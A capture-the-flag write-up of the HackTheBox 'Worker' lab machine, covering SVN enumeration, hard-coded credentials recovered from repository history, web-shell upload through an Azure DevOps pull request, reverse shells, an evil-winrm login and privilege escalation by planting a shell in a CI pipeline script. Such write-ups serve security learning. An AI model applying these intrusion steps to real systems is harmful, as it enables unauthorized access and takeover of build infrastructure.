---
icon: /assets/avatars/worker.png
title: Worker Writeup
author: Valerio Casalino
style: fill
color: primary
tags: [Writeups, Hackthebox]
description: <img src="/assets/avatars/unbalanced.png"> Writeup for Worker (Hackthebox)
---

# Worker

I'm tired of saying that every time... Let's start with `nmap`:

```bash
ports=$(sudo nmap -p- --min-rate=1000 -T4 10.10.10.203 | grep "^[0-9]" | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
sudo nmap -sC -sV -p $ports 10.10.10.203
...
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
3690/tcp open  svnserve Subversion
5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
...
```

Going to port 80, we find the default Microsoft IIS welcome page:

![image-20201220024433640](/assets/worker/image-20201220024433640.png)

Let's enumerate the `svn` service:

```bash
> svn info svn://10.10.10.203
Path: .
URL: svn://10.10.10.203
Relative URL: ^/
Repository Root: svn://10.10.10.203
Repository UUID: 2fc74c5a-bc59-0744-a2cd-8b7d1d07c9a1
Revision: 5
Node Kind: directory
Last Changed Author: nathen
Last Changed Rev: 5
Last Changed Date: 2020-06-20 15:52:00 +0200 (Sat, 20 Jun 2020)
```

We know that there is an user named `nathen` and that this is a `svn` location! Now let's list and download the content (if we can):

```bash
> svn list svn://10.10.10.203/
dimension.worker.htb/
moved.txt
> svn export svn://10.10.10.203/
...
> cat moved.txt
This repository has been migrated and will no longer be maintaned here.
You can find the latest version at: http://devops.worker.htb

// The Worker team :)
```

Now we have `moved.txt` and the source code for what it seems to be a website named `dimension.worker.htb`. Now... In that folder you'll find info about every subdomain of this thing... I checked all them out so you don't have to :) .

They could have been found by subdomain enumeration, using a good wordlist (like [this one](https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-110000.txt)) and `wfuzz`:

```bash
wfuzz -c -w ./subdomains-top1million-110000.txt -u 'http:/assets/worker.htb' -H "Host: FUZZ.worker.htb" --hw 55 --hc 400
...
alpha
story
cartoon
lens
dimension
spectral
twenty
...
```

Anyway... going on with SVN, we want to checkout the repo and see what's inside:

```bash
> svn checkout svn://10.10.10.203/
...
> svn log
------------------------------------------------------------------------
r5 | nathen | 2020-06-20 15:52:00 +0200 (Sat, 20 Jun 2020) | 1 line

Added note that repo has been migrated
------------------------------------------------------------------------
r4 | nathen | 2020-06-20 15:50:20 +0200 (Sat, 20 Jun 2020) | 1 line

Moving this repo to our new devops server which will handle the deployment for us
------------------------------------------------------------------------
r3 | nathen | 2020-06-20 15:46:19 +0200 (Sat, 20 Jun 2020) | 1 line

-
------------------------------------------------------------------------
r2 | nathen | 2020-06-20 15:45:16 +0200 (Sat, 20 Jun 2020) | 1 line

Added deployment script
------------------------------------------------------------------------
r1 | nathen | 2020-06-20 15:43:43 +0200 (Sat, 20 Jun 2020) | 1 line

First version
------------------------------------------------------------------------
```

We didn't see a deployment script in this version, so let's take a look:

```bash
> svn checkout -r 2 svn://10.10.10.203/
D    moved.txt
A    deploy.ps1
Checked out revision 2.
> cat deploy.ps1
$user = "nathen"
$plain = "wendel98"
$pwd = ($plain | ConvertTo-SecureString)
$Credential = New-Object System.Management.Automation.PSCredential $user, $pwd
$args = "Copy-Site.ps1"
Start-Process powershell.exe -Credential $Credential -ArgumentList ("-file $args")
```

Spoiler alert: nathen:wendel98 are creds to get past the http authentication in http://devops.worker.htb.

Going to that web location and authenticating gives us a dashboard in the Azure DevOps:

![image-20201220134345531](/assets/worker/image-20201220134345531.png)

Going around we find the code that is being deployed for `spectral.worker.htb` as a repository, so the normal thing to do is uploading a web shell! I chose [this one](https://github.com/xl7dev/WebShell/blob/master/Aspx/ASPX%20Shell.aspx). From [this page](http://devops.worker.htb/ekenas/SmartHotel360/_git/spectral/branches), add a branch, put your file or code and initiate a pull request (choose a work item from Boards > Work Items), then from [this page](http://devops.worker.htb/ekenas/SmartHotel360/_git/spectral/pullrequests?_a=mine) select your pull request and accept it from the top menu. Then, visiting the page you'll get a webshell! From that it is a good idea to initiate a reverse shell (the repo resets itself pretty quickly). Use the `powershell` reverse shell to go ahead (refer to [this link](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell) for the code). 

![image-20201220141727852](/assets/worker/image-20201220141727852.png)

List the drives mounted in the system with:

```powershell
# https://www.thewindowsclub.com/list-drives-using-command-prompt-powershell-windows
wmic logicaldisk get name
Name
C:
W:
```

Then, looking in the config files `svnrepos/www/conf`, we can see some (valid) credentials: `robisl:wolves11`. NB: use `dir C:\Users\\` to see valid users! `evil-winrm` is your friend here!

```bash
evil-winrm -i 10.10.10.203 -u robisl -p wolves11
# Get your flag ;)
```

Back to `devops.worker.htb`, if we use the creds to pass the http auth, we'll be interacting with `robisl` dashboard.

We're going to create a Pipeline: Pipelines > New Pipeline > Azure Repos Git > PartsUnlimited > Starter Pipeline. In the appearing YAML file delete `pool: "Default"` since we don't have a default pool, then put the same reverse shell code you used before in the `script` section. To use `powershell`, refer to [MS guide](https://docs.microsoft.com/en-us/azure/devops/pipelines/tasks/utility/powershell?view=azure-devops).

![image-20201220151739539](/assets/worker/image-20201220151739539.png)

Save and run it on new branch! (after initiating a listener on the attacker machine). It will not be immediate, but after a couple of seconds, or minutes...

![image-20201220152625358](/assets/worker/image-20201220152625358.png)

Ps. if it doesn't work, try other reverse shell implementations... Anyway... profit!
